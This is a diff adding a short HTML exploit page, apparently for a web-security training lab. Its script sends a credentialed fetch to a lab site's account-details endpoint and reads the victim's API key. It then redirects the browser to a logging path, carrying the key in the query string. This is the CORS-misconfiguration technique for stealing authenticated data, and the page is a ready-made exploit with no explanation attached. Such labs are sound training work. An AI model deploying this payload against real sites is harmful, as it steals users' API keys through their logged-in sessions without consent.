@@ -1,0 +1,15 @@
+<html>
+
+<body>
+    <script>
+        var url = 'https://0a6000610475ad43c1ea079a0053001a.web-security-academy.net/accountDetails';
+        var webhook = '/location?k=';
+        fetch(url, {
+            credentials: "include"
+        }).then(response => response.json()).then(data => {
+            location = webhook + data.apikey;
+        }); 
+    </script>
+</body>
+
+</html>
